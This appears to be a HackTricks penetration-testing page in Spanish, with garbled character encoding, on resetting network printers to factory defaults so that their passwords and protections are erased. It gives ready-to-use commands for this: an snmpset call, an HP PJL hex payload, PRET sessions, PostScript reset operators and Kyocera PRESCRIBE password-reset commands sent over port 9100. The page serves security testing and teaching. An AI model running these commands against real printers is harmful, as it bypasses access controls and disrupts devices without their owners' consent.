<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- ObtÃ©n la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**Restablecer** un dispositivo a los valores de fÃ¡brica es una funcionalidad crÃ­tica de seguridad ya que **sobrescribe los mecanismos de protecciÃ³n** como las contraseÃ±as establecidas por el usuario. Esto se puede hacer generalmente presionando una **combinaciÃ³n de teclas especiales** en el **panel de control** de la impresora. Realizar un restablecimiento de este tipo solo lleva segundos y, por lo tanto, es un escenario realista para atacantes locales o probadores de penetraciÃ³n, que pueden, por ejemplo, colarse en la sala de copias durante el almuerzo. Sin embargo, **no siempre es posible tener acceso fÃ­sico** al dispositivo.

### SNMP

El Printer-MIB define el objeto **prtGeneralReset** (**OID 1.3.6.1.2.1.43.5.1.1.3.1**) que permite a un atacante reiniciar el dispositivo (powerCycleReset(4)), restablecer la configuraciÃ³n de NVRAM (resetToNVRAM(5)) o restaurar los valores de fÃ¡brica (resetToFactoryDefaults(6)) utilizando SNMP. Esta caracterÃ­stica/ataque es **compatible con una gran variedad de impresoras** y elimina todos los mecanismos de protecciÃ³n como las contraseÃ±as establecidas por el usuario para el servidor web integrado. Si bien los mecanismos de protecciÃ³n se pueden pasar eficientemente por alto, una desventaja prÃ¡ctica de este enfoque es que se perderÃ¡ toda la **configuraciÃ³n de direcciÃ³n IP estÃ¡tica**. **Si no hay un servicio DHCP** disponible, el atacante **no podrÃ¡ volver a conectarse** al dispositivo despuÃ©s de restablecerlo a los valores de fÃ¡brica.

**Restablecer el dispositivo a los valores de fÃ¡brica** se puede lograr utilizando el comando `snmpset` como se muestra a continuaciÃ³n (necesita conocer la **cadena de comunidad**, que por defecto en la mayorÃ­a de los casos es `public`):
```bash
snmpset -v1 -c public printer 1.3.6.1.2.1.43.5.1.1.3.1 i 6
```
### [PML](./#pml)/[PJL](./#pjl)

En muchos escenarios, un atacante no tiene la capacidad de realizar solicitudes SNMP debido a cortafuegos o cadenas de comunidad SNMP desconocidas. Sin embargo, en dispositivos **HP**, **SNMP** se puede transformar en su representaciÃ³n **PML** e incrustar la solicitud dentro de un trabajo de impresiÃ³n legÃ­timo. Esto permite a un atacante **reiniciar y/o restablecer el dispositivo** a los valores predeterminados de fÃ¡brica dentro de trabajos de impresiÃ³n ordinarios, como se muestra a continuaciÃ³n:
```bash
@PJL DMCMD ASCIIHEX="040006020501010301040106"
```
Cualquiera puede reproducir este ataque en impresoras HP, reiniciar o restablecer el dispositivo puede hacerse fÃ¡cilmente utilizando [**PRET**](https://github.com/RUB-NDS/PRET):
```bash
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> reset
printer:/> restart
```
### PostScript

PostScript ofrece una caracterÃ­stica similar: el parÃ¡metro del sistema **FactoryDefaults**, "una bandera que, si se establece en verdadero inmediatamente antes de que se apague la impresora, hace que todos los parÃ¡metros no volÃ¡tiles vuelvan a sus valores predeterminados de fÃ¡brica en el prÃ³ximo encendido". Cabe seÃ±alar que PostScript en sÃ­ tambiÃ©n tiene la capacidad de reiniciar su entorno, pero requiere una contraseÃ±a vÃ¡lida. \
Sin embargo, el intÃ©rprete de PostScript puede ser puesto en un bucle infinito como se discute en los ataques de denegaciÃ³n de servicio (DoS) de procesamiento de documentos, lo que obliga al usuario a reiniciar manualmente el dispositivo y, por lo tanto, restablecer la contraseÃ±a de PostScript.

Restablecer los parÃ¡metros del sistema PostScript a los valores predeterminados de fÃ¡brica:
```bash
<< /FactoryDefaults true >> setsystemparams
```
Reiniciar el intÃ©rprete PostScript y la memoria virtual:
```bash
true 0 startjob systemdict /quit get exec
```
Cualquier persona puede reiniciar o restablecer el intÃ©rprete PostScript de una impresora **fÃ¡cilmente se puede reproducir usando** [**PRET**](https://github.com/RUB-NDS/PRET):
```bash
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> reset
printer:/> restart
```
### PRESCRIBE

Para dispositivos **Kyocera**, los lenguajes de descripciÃ³n de pÃ¡gina **PRESCRIBE** se pueden utilizar para **restablecer el dispositivo** a los valores de fÃ¡brica desde trabajos de impresiÃ³n ordinarios utilizando uno de los comandos que se muestran a continuaciÃ³n:
```bash
!R! KSUS "AUIO", "CUSTOM:Admin Password = 'admin00'";  CMMT "Drop the security level, reset password";
!R! ACNT "REST";                                       CMMT "Reset account code admin password";
!R! EGRE;                                              CMMT "Reset the engine board to factory defaults";
!R! SIOP0,"RESET:0";                                   CMMT "Reset configuration settings";
```
Para reproducir este ataque, abra una conexiÃ³n de red cruda al puerto 9100/tcp de la impresora y **envÃ­e los comandos documentados arriba**.
